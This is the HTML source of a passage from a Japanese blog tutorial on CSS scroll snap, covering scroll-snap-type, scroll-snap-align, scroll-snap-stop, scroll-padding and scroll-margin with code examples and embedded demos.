&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro.png" data-size="980x497">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro.png"
width="980"
height="497"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://drafts.csswg.org/css-scroll-snap-1/#intro" target="_blank" rel="noopener"
>CSSの仕様&lt;/a>によると、CSSスクロールスナップを導入することでユーザーエクスペリエンスが向上し、スクロールの実装が容易になり、ユーザーと開発者、双方にメリットがあるということです。&lt;/p>
&lt;h2 id="スクロールコンテナーの基本">スクロールコンテナーの基本&lt;/h2>
&lt;p>スクロールコンテナーを作成するために必要な基本的なものは次のとおりです。&lt;/p>
&lt;ul>
&lt;li>overflowをvisible以外の値で使用&lt;/li>
&lt;li>項目を隣同士（インライン）に表示す&lt;/li>
&lt;/ul>
&lt;p>例を見てみましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 1&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 2&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 3&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 4&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 5&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">white-space&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">nowrap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>以前までは&lt;code>white-space: nowrap&lt;/code>を使用することで要素を横並びで表示するようにしていました。&lt;br>
近年では、この方法の代わりに&lt;code>Flexbox&lt;/code>を使用することで表現可能です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 420;
flex-basis: 1009px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro-2.png" data-size="980x233">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro-2.png"
width="980"
height="233"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>これは、スクロールコンテナーを作成するための基本的な構成です。&lt;br>
しかし、これだけではスクロールコンテナーの機能としては不十分です。&lt;/p>
&lt;h2 id="従来の問題">従来の問題&lt;/h2>
&lt;p>従来の問題は、スワイプの仕組みと比較して、優れたUXが提供されないことです。タッチスクリーンでのスワイプジェスチャの主な利点は、1本の指で水平または垂直にスクロールできることです。&lt;br>
以前のソリューションでは、ただスクロールするだけです。文字通り、各アイテムをそれぞれの場所に移動する必要があります。これはスワイプではなく、ユーザーにとって非常にストレスを与える結果になってしまします。&lt;br>
CSSスクロールスナップを使用すると、ユーザーが水平方向または垂直方向にスクロールしやすくなるスナップポイントを定義するだけで、この問題を解決できます。&lt;/p>
&lt;p>CSSスクロールスナップの使用方法を見てみましょう。&lt;/p>
&lt;h2 id="cssスクロールスナップの紹介">CSSスクロールスナップの紹介&lt;/h2>
&lt;p>コンテナーでスクロールスナップを使用するには、その子アイテムをinlineで表示する必要があります。これは、上記で説明した方法の1つで実行できます。 CSSフレックスボックスを使用します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 1&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 2&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 3&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 4&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;section__item&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Item 5&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>さらに、スクロールスナップを機能させるために2つのプロパティを追加します。&lt;br>
まず、スクロールコンテナーに&lt;code>scroll-snap-type&lt;/code>を追加します。この例では、これは&lt;code>.section&lt;/code>要素です。&lt;br>
次に、子アイテム（&lt;code>.section__item&lt;/code>）に&lt;code>scroll-snap-align&lt;/code>を追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">section__item&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>x mandatory&lt;/code>と&lt;code>start&lt;/code>の値についてはじめて見たと思われるかもしれませんが、この部分が今回の記事のメインになる部分です。&lt;/p>
&lt;p>これらのプロパティにより、スクロールコンテナーの開始位置にスナップすることが可能になって、スクロールがより自然になりました。&lt;br>
それでは、スクロールスナップのプロパティについて詳しく見ていきましょう。&lt;/p>
&lt;h3 id="scroll-snap-type">scroll-snap-type&lt;/h3>
&lt;p>&lt;a class="link" href="https://drafts.csswg.org/css-scroll-snap-1/#@40@" target="_blank" rel="noopener"
>CSSの仕様&lt;/a> によると、&lt;code>scroll-snap-type&lt;/code>は、ある要素がスクロールスナップコンテナーであるかどうか、どの程度厳密にスナップするか、どの軸を考慮するかを指定するものです。&lt;/p>
&lt;p>それを解析してみましょう。&lt;/p>
&lt;h4 id="スクロールスナップコンテナーの軸について">スクロールスナップコンテナーの軸について&lt;/h4>
&lt;p>スクロールスナップコンテナーの軸は、スクロールの方向を表します。水平または垂直にできます。&lt;br>
xの値は水平方向のスクロールを、yの値は垂直方向のスクロールを表します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="c">/* Horizontal */&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c">/* Vertical */&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">250&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 262;
flex-basis: 628px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/x-vs-y.png" data-size="980x374">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/x-vs-y.png"
width="980"
height="374"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h4 id="スクロールスナップコンテナーの精密さ">スクロールスナップコンテナーの精密さ&lt;/h4>
&lt;p>スクロールスナップの方向だけでなく、その精密さも定義できます。&lt;br>
これは、&lt;code>scroll-snap-type&lt;/code>値に&lt;code>mandatory | proximity&lt;/code>のいずれかの値を使用することで可能です。&lt;/p>
&lt;p>&lt;code>mandatory&lt;/code>は、ブラウザが各スクロールポイントにスナップする必要があることを意味します。&lt;code>scroll-snap-align&lt;/code>プロパティの値が&lt;code>start&lt;/code>であると仮定してみましょう。つまり、スクロールはスクロールコンテナーの開始点にスナップする必要があります。&lt;/p>
&lt;p>下図では、ユーザーが右方向にスクロールするたび、ブラウザはコンテナーの開始点にアイテムをスナップさせます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 185;
flex-basis: 444px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-mandatory.png" data-size="980x529">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-mandatory.png"
width="980"
height="529"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">section__item&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>下のデモで右方向にスクロールしてみてください。スクロールバーを右に移動させるか、スマートフォンやタブレットの場合はタッチ操作で行ってください。各アイテムがコンテナーの始まりにスナップする様子が感じられるはずです。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/uzo5ag2q/1/embed/result,html,css/">&lt;/script>
&lt;p>しかし、値が&lt;code>proximity&lt;/code>の場合は、ブラウザが作業を行います。定義された点（この例では&lt;code>start&lt;/code>）にスナップするかもしれません&lt;code>。proximity&lt;/code>はデフォルトの値ですが、わかりやすくするために追加しておきます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 185;
flex-basis: 444px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-proximity.png" data-size="980x529">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-proximity.png"
width="980"
height="529"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c">/* proximityはデフォルト値です。 */&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="kc">proximity&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="スクロールスナップの方向">スクロールスナップの方向&lt;/h3>
&lt;p>スクロールコンテナーの子アイテムには、スナップできるアライメントポイントが必要です。&lt;br>
&lt;code>start&lt;/code>、&lt;code>center&lt;/code>、&lt;code>end&lt;/code>のいずれかを使用します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 188;
flex-basis: 452px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-align.png" data-size="980x520">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-align.png"
width="980"
height="520"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>スクロールコンテナーに磁石があり、スナップポイントを制御するのに役立つと想像してみてください。&lt;br>
&lt;code>scroll-snap-type&lt;/code>が垂直の場合、スナップの配置は垂直になります。次の図を参照してください。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 188;
flex-basis: 452px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-align-y.png" data-size="980x520">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-snap-align-y.png"
width="980"
height="520"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>これをより明確にするため、 &lt;code>start&lt;/code> 、&lt;code>center&lt;/code>、および&lt;code>end&lt;/code>の以下のアニメーションを参照してください。&lt;/p>
&lt;h4 id="スクロールコンテナーの-start">スクロールコンテナーの &lt;code>start&lt;/code>&lt;/h4>
&lt;script async src="//jsfiddle.net/wyoshi/csnuyvg8/7/embed/result/">&lt;/script>
&lt;p>子アイテムは、水平スクロールコンテナーの先頭にスナップします。&lt;/p>
&lt;h4 id="スクロールコンテナーの-center">スクロールコンテナーの &lt;code>center&lt;/code>&lt;/h4>
&lt;script async src="//jsfiddle.net/wyoshi/csnuyvg8/8/embed/result/">&lt;/script>
&lt;p>子アイテムは、スクロールコンテナーの中央にスナップします。&lt;/p>
&lt;h4 id="スクロールコンテナーの-end">スクロールコンテナーの &lt;code>end&lt;/code>&lt;/h4>
&lt;script async src="//jsfiddle.net/wyoshi/csnuyvg8/9/embed/result/">&lt;/script>
&lt;p>子アイテムは、スクロールコンテナーの最後にスナップします。&lt;/p>
&lt;h2 id="scroll-snap-stopを使う">scroll-snap-stopを使う&lt;/h2>
&lt;p>ユーザーがあまりに速くスクロールするなど、スクロール中にユーザーが誤って重要な項目をスキップしてしまうのを防ぐ方法が必要な場合もあります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section__item&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">scroll-snap-stop&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">normal&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;script async src="//jsfiddle.net/wyoshi/csnuyvg8/11/embed/result/">&lt;/script>
&lt;p>スクロールのスピードが速すぎる（勢いよくスクロールする）と、3つも4つも項目が飛ばされることもあります。&lt;/p>
&lt;p>&lt;code>scroll-snap-stop&lt;/code> のデフォルト値は&lt;code>normal&lt;/code>です。スクロールを強制的にすべての可能なポイントにスナップするには、&lt;code>always&lt;/code>を使用する必要があります。 &lt;code>scroll-snap-stop: always&lt;/code>を使用すると、ブラウザは各スナップポイントで停止します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section__item&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">scroll-snap-stop&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">always&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>そうすれば、ユーザーは1つずつスナップポイントをスクロールしていくことができ、重要な項目をスキップすることを避けることができます。&lt;br>
各ストップポイントにストップサインがあることを想像してください。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/csnuyvg8/51/embed/result/">&lt;/script>
&lt;p>デモで下のスクロールを試して、オプションを切り替えてみてください。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/7b95e0xj/2/embed/result/">&lt;/script>
&lt;h2 id="スクロールスナップのpadding">スクロールスナップのpadding&lt;/h2>
&lt;p>&lt;code>scroll-padding&lt;/code>短縮形プロパティは、&lt;code>padding&lt;/code>プロパティの動作と同様に、すべての側面にスクロールパディングを設定します。&lt;br>
下図では、スクロールコンテナーの左側に50pxのパディングが設定されています。その結果、子要素は左端から50pxずれた位置にスナップします。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">scroll-padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 298;
flex-basis: 717px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-padding.png" data-size="980x328">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-padding.png"
width="980"
height="328"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>同じことが垂直スクロールでも機能します。以下の例を参照してください。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">section&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">overflow-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">y&lt;/span> &lt;span class="kc">mandatory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">scroll-padding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 288;
flex-basis: 691px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-padding-2.png" data-size="980x340">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-padding-2.png"
width="980"
height="340"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="スクロールスナップのmargin">スクロールスナップのmargin&lt;/h2>
&lt;p>&lt;code>scroll-margin&lt;/code>ショートハンドプロパティは、スクロールコンテナーの子アイテム間の間隔を設定します。要素にマージンが追加されると、マージンに応じてスクロールがスナップします。下図を参照してください。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 232;
flex-basis: 557px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-margin.png" data-size="980x422">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/scroll-margin.png"
width="980"
height="422"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;code>.item-2&lt;/code>は&lt;code>scroll-margin-left: 20px&lt;/code>となっています。その結果、スクロールコンテナーはそのアイテムの手前20pxにスナップします。ユーザーが再び右にスクロールしたとき、&lt;code>.item-3&lt;/code>はスクロールコンテナーの開始位置にスナップすることに注意してください。つまり、マージンを持つ要素のみが影響を受けることになります。&lt;/p>
&lt;h2 id="cssスクロールスナップの使用例">CSSスクロールスナップの使用例&lt;/h2>
&lt;h3 id="画像リスト">画像リスト&lt;/h3>
&lt;p>CSSスクロールスナップの優れた使用例として、画像のリストが挙げられます。スクロールスナップを使用することで、より良いスクロール体験を提供します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 309;
flex-basis: 741px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-1.png" data-size="980x317">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/use-case-1.png"
width="980"
height="317"
loading="lazy"
alt="CSSでアプリのようにピタッとスナップするスクロールを作成の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">images-list&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">scroll-snap-type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">gap&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="kt">rem&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kp">-webkit-&lt;/span>&lt;span class="n">overflow-scrolling&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">touch&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c">/* Important for iOS devices */&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">images-list&lt;/span> &lt;span class="nt">img&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">scroll-snap-align&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
